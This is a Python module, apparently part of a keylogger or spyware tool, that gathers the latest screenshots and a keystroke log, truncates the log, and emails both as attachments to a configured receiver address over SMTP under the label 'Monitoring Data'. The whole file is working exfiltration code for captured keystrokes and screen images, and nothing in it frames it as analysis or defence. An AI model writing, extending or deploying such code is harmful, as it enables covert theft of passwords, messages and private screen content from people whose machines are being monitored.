import logging
from pathlib import Path
from modules.email_sender import EmailSender
from datetime import datetime

class ScreenshotKeylogSender:
    def __init__(self, screenshot_dir, keylog_file):
        self.sender = EmailSender()
        self.screenshot_dir = Path(screenshot_dir)
        self.keylog_file = Path(keylog_file)
        self.logger = logging.getLogger(__name__)
        
    def send_latest(self, email_config, max_screenshots=5, max_keylog_size=100000):
        """Send latest screenshots and keylogs with size limits"""
        try:
            # Get latest screenshots
            screenshots = sorted(
                self.screenshot_dir.glob('*.png'),
                key=lambda f: f.stat().st_mtime,
                reverse=True
            )[:max_screenshots]
            
            # Prepare truncated keylog if needed
            keylog_attachment = self._prepare_keylog(max_keylog_size)
            
            attachments = [str(keylog_attachment)] if keylog_attachment else []
            attachments.extend(str(s) for s in screenshots)
            
            if not attachments:
                return "No data to send"
                
            date_str = datetime.now().strftime("%Y-%m-%d %H:%M")
            subject = f"Monitoring Data - {date_str}"
            body = f"Attached are {len(screenshots)} screenshots and keylog data."
            
            return self.sender.send_email(
                email_config['sender_email'],
                email_config['sender_password'],
                email_config['smtp_server'],
                email_config['smtp_port'],
                email_config['receiver_email'],
                subject,
                body,
                attachments
            )
        except Exception as e:
            self.logger.error(f"Error sending screenshot/keylog: {e}")
            return f"Error: {str(e)}"

    def _prepare_keylog(self, max_size):
        """Create a truncated version if keylog is too large"""
        if not self.keylog_file.exists():
            return None
            
        file_size = self.keylog_file.stat().st_size
        if file_size <= max_size:
            return self.keylog_file
            
        # Create truncated version
        temp_path = self.keylog_file.parent / f"truncated_{self.keylog_file.name}"
        with open(self.keylog_file, 'rb') as src:
            content = src.read(max_size)
        with open(temp_path, 'wb') as dst:
            dst.write(content)
            
        return temp_path